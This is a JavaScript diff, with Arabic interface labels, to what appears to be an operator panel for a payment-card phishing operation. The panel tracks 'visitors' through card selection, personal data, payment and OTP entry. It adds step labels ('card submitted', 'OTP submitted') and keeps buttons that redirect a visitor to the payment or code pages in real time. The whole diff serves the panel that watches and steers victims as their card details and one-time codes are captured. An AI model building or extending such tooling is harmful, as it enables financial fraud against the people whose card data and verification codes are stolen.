@@ -559,7 +559,8 @@
         email: m.email || '',
         network: m.network || '',
         step: m.step || '',
-        currentPage: m.redirectPage || m.currentPage || '',
+        currentStep: m.currentStep || '',
+        currentPage: m.currentStep || m.redirectPage || m.currentPage || '',
         // الحالة والعرض
         status: m.status || 'pending',
         decision: m.decision || '',
@@ -647,6 +648,24 @@
         ...records.map((record) => toCounterMillis(record.createdAt || record.cardCreatedAt || record.timestamp))
       );
     };
+    const routeLabels = {
+      home: 'الرئيسية', '/': 'الرئيسية', index: 'الرئيسية',
+      cards: 'اختيار البطاقة', compar: 'اختيار البطاقة', card: 'اختيار البطاقة',
+      register: 'التسجيل', registration: 'التسجيل',
+      order: 'الطلب', insur: 'الطلب',
+      payment: 'الدفع',
+      otp: 'رمز التحقق', phone: 'رمز التحقق', pin: 'رمز التحقق',
+      code: 'الرمز',
+      home_page: 'الرئيسية', card_selection: 'اختيار البطاقة',
+      personal_info: 'البيانات الشخصية', otp_submitted: 'رمز التحقق',
+      card_submitted: 'بيانات البطاقة',
+    };
+    const routeLabel = (value) => {
+      const raw = String(value || '').trim();
+      if (!raw) return 'في انتظار التفاعل';
+      const key = raw.toLowerCase().replace(/^\//, '').replace(/\.html$/, '');
+      return routeLabels[key] || (raw.startsWith('/') ? `في صفحة ${raw}` : raw);
+    };
     const list = allNotifications.filter(n => {
       if (referenceFilter === 'archive') {
         if (!n.isArchived) return false;
@@ -665,7 +684,7 @@
       const latestBoxTime = referenceActivityTime(n);
       const recentActivity = latestBoxTime > 0 && (Date.now() - latestBoxTime) < 35000;
       const title = n.name || n.phone || n.country || 'زائر جديد';
-      const subtitle = n.currentPage || n.bank || 'في انتظار التفاعل';
+      const subtitle = routeLabel(n.currentStep || n.currentPage || n.redirectPage) || n.bank || 'في انتظار التفاعل';
       const checked = selectedReferenceIds.has(n.id);
       return `<button class="reference-visitor-row ${checked ? 'bulk-selected' : ''}" data-ref-id="${escapeHtml(n.id)}">
         <span class="reference-checkbox" data-ref-check="${escapeHtml(n.id)}">${checked ? '☑' : '□'}</span>
@@ -717,6 +736,12 @@
     if (remove) { remove.disabled = !count; remove.textContent = count ? `× حذف (${count})` : '× حذف'; }
   }
 
+  const routeLabelsGlobal = {
+    home: 'الرئيسية', '/': 'الرئيسية', index: 'الرئيسية', cards: 'اختيار البطاقة', compar: 'اختيار البطاقة', card: 'اختيار البطاقة',
+    register: 'التسجيل', registration: 'التسجيل', order: 'الطلب', insur: 'الطلب', payment: 'الدفع', otp: 'رمز التحقق', phone: 'رمز التحقق', pin: 'رمز التحقق', code: 'الرمز',
+    home_page: 'الرئيسية', card_selection: 'اختيار البطاقة', personal_info: 'البيانات الشخصية', otp_submitted: 'رمز التحقق', card_submitted: 'بيانات البطاقة'
+  };
+  const getRouteLabel = (value) => { const raw = String(value || '').trim(); if (!raw) return 'في انتظار التفاعل'; const key = raw.toLowerCase().replace(/^\//, '').replace(/\.html$/, ''); return routeLabelsGlobal[key] || (raw.startsWith('/') ? `في صفحة ${raw}` : raw); };
   function renderReferenceDetail(visitor) {
     if (!els.referenceDetailContent || !visitor) return;
     const name = visitor.name || visitor.phone || visitor.country || 'زائر جديد';
@@ -810,7 +835,7 @@
       })
       .map(s => s.html)
       .join('');
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="compar">البطاقات</button><button data-ref-nav="register">التسجيل</button><button data-ref-nav="insur">الطلب</button><button data-ref-nav="payment">الدفع</button><button data-ref-nav="otp">رمز التحقق</button><button data-ref-nav="code">الرمز</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="compar">البطاقات</option><option value="register">التسجيل</option><option value="insur">الطلب</option><option value="payment">الدفع</option><option value="otp">رمز التحقق</option><option value="code">الرمز</option></select></div><div class="ref-detail-stack">${stackSections}</div>`;
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(getRouteLabel(visitor.currentStep || visitor.currentPage || visitor.redirectPage) || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="compar">البطاقات</button><button data-ref-nav="register">التسجيل</button><button data-ref-nav="insur">الطلب</button><button data-ref-nav="payment">الدفع</button><button data-ref-nav="otp">رمز التحقق</button><button data-ref-nav="code">الرمز</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="compar">البطاقات</option><option value="register">التسجيل</option><option value="insur">الطلب</option><option value="payment">الدفع</option><option value="otp">رمز التحقق</option><option value="code">الرمز</option></select></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
